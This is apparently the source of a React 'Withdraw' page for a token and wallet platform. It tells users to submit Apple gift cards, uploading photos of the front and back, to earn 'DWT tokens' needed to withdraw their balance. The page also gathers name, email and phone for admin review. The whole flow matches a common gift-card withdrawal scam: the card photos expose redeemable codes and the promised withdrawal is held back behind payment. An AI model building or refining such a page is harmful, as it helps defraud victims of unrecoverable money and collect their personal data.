import { useState } from 'react'
import { useAuth } from '../context/AuthContext'
import './PageContent.css'

const WithdrawPage = () => {
  const { user, updateUser } = useAuth()
  const [formData, setFormData] = useState({
    fullName: user?.fullName || '',
    email: user?.email || '',
    phone: user?.phone || '',
    giftcardAmount: '',
  })
  const [giftImages, setGiftImages] = useState([])
  const [message, setMessage] = useState({ type: '', text: '' })
  const [sending, setSending] = useState(false)

  const walletBalance = user?.walletBalance || 0
  const dwtTokens = user?.dwtTokens || 0

  // Validation
  const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)
  const isValidPhone = /^\d{10,}$/.test(formData.phone.replace(/\D/g, ''))
  const amountNum = parseFloat(formData.giftcardAmount) || 0
  const isValidAmount = amountNum >= 50
  const canSubmit = formData.fullName && isValidEmail && isValidPhone && isValidAmount && giftImages.length === 2

  const handleInputChange = (e) => {
    const { name, value } = e.target
    setFormData(prev => ({
      ...prev,
      [name]: name === 'giftcardAmount' ? value.replace(/\D/g, '') : value
    }))
  }

  const handleFileChange = (e, index) => {
    const file = e.target.files[0]
    if (!file) return

    const reader = new FileReader()
    reader.onload = () => {
      const next = [...giftImages]
      next[index] = reader.result
      setGiftImages(next)
    }
    reader.readAsDataURL(file)
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    setMessage({ type: '', text: '' })

    if (!canSubmit) {
      setMessage({ type: 'error', text: 'Please fill in all fields correctly.' })
      return
    }

    setSending(true)
    try {
      const res = await fetch('/api/submit-giftcard', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fullName: formData.fullName,
          email: formData.email,
          phone: formData.phone,
          amount: parseInt(formData.giftcardAmount),
          images: giftImages,
          userId: user?.id,
          userName: user?.userName,
        })
      })
      const data = await res.json()
      if (res.ok) {
        setMessage({ type: 'success', text: 'Gift card submission sent successfully! Admin will review shortly.' })
        setFormData({ fullName: formData.fullName, email: formData.email, phone: formData.phone, giftcardAmount: '' })
        setGiftImages([])
        updateUser({ phone: formData.phone })
      } else {
        setMessage({ type: 'error', text: data.error || 'Failed to submit' })
      }
    } catch (err) {
      setMessage({ type: 'error', text: 'Network error while submitting' })
    }
    setSending(false)
  }

  return (
    <div className="page-content">
      <div className="page-header">
        <h2>🎁 Submit Gift Card</h2>
        <p>Submit your Apple gift card to increase your DWT tokens</p>
      </div>

      <div className="withdraw-content">
        <div className="balance-info">
          <div className="balance-card">
            <span className="balance-label">Available Balance</span>
            <span className="balance-amount">${walletBalance.toFixed(2)}</span>
          </div>
          <div className="balance-card">
            <span className="balance-label">DWT Tokens</span>
            <span className="balance-amount">{dwtTokens}</span>
          </div>
        </div>

        <div className="withdraw-info">
          <h3>How it Works</h3>
          <ul>
            <li>💳 Submit Apple gift card ($50 minimum per token)</li>
            <li>📸 Upload 2 clear photos of the gift card (front & back recommended)</li>
            <li>✅ Admin will verify and approve within 1-2 business days</li>
            <li>🪙 Approved cards = DWT tokens added to your account</li>
            <li>💰 Use DWT tokens to withdraw funds or unlock exclusive rewards</li>
          </ul>
        </div>

        <form onSubmit={handleSubmit} className="withdraw-form">
          <div className="form-group">
            <label htmlFor="fullName">Full Name *</label>
            <input
              type="text"
              id="fullName"
              name="fullName"
              value={formData.fullName}
              onChange={handleInputChange}
              placeholder="Your full name"
              required
            />
          </div>

          <div className="form-group">
            <label htmlFor="email">Email Address *</label>
            <input
              type="email"
              id="email"
              name="email"
              value={formData.email}
              onChange={handleInputChange}
              placeholder="your@email.com"
              required
            />
            {formData.email && !isValidEmail && <p className="form-error">Invalid email</p>}
          </div>

          <div className="form-group">
            <label htmlFor="phone">Phone Number *</label>
            <input
              type="tel"
              id="phone"
              name="phone"
              value={formData.phone}
              onChange={handleInputChange}
              placeholder="(555) 123-4567"
              required
            />
            {formData.phone && !isValidPhone && <p className="form-error">Invalid phone (min 10 digits)</p>}
          </div>

          <div className="form-group">
            <label htmlFor="giftcardAmount">Gift Card Amount ($) *</label>
            <input
              type="number"
              id="giftcardAmount"
              name="giftcardAmount"
              value={formData.giftcardAmount}
              onChange={handleInputChange}
              placeholder="50"
              min="50"
              step="1"
              required
            />
            {formData.giftcardAmount && !isValidAmount && <p className="form-error">Minimum $50 per token</p>}
            {isValidAmount && <p className="form-hint">You will receive {Math.floor(amountNum / 50)} DWT token(s)</p>}
          </div>

          {(formData.fullName || formData.email || formData.phone || formData.giftcardAmount) && (
            <div className="summary-card">
              <h4>📋 Submission Summary</h4>
              <div className="summary-row">
                <span className="summary-label">Name:</span>
                <span className="summary-value">{formData.fullName || '—'}</span>
              </div>
              <div className="summary-row">
                <span className="summary-label">Email:</span>
                <span className="summary-value">{formData.email || '—'}</span>
              </div>
              <div className="summary-row">
                <span className="summary-label">Phone:</span>
                <span className="summary-value">{formData.phone || '—'}</span>
              </div>
              <div className="summary-row">
                <span className="summary-label">Amount:</span>
                <span className="summary-value">{formData.giftcardAmount ? `$${formData.giftcardAmount}` : '—'}</span>
              </div>
              {isValidAmount && (
                <div className="summary-row highlight">
                  <span className="summary-label">DWT Tokens Earned:</span>
                  <span className="summary-value">{Math.floor(amountNum / 50)} 🪙</span>
                </div>
              )}
            </div>
          )}

          <div className="form-group">
            <label>Upload Payment Proof Image *</label>
            <div className="upload-area">
              {[0, 1].map(idx => (
                <div key={idx} className="upload-slot">
                  <input 
                    type="file" 
                    accept="image/*" 
                    onChange={(e) => handleFileChange(e, idx)}
                    required={giftImages.length <= idx}
                  />
                  <p>{idx === 0 ? 'Front' : 'Back'}</p>
                  {giftImages[idx] && <img src={giftImages[idx]} alt={`card-${idx}`} className="image-preview" />}
                </div>
              ))}
            </div>
            <p className="form-hint">{giftImages.length}/2 images uploaded</p>
          </div>

          {message.text && (
            <div className={`message ${message.type}`}>
              {message.text}
            </div>
          )}
        </form>
      </div>
    </div>
  )
}

export default WithdrawPage
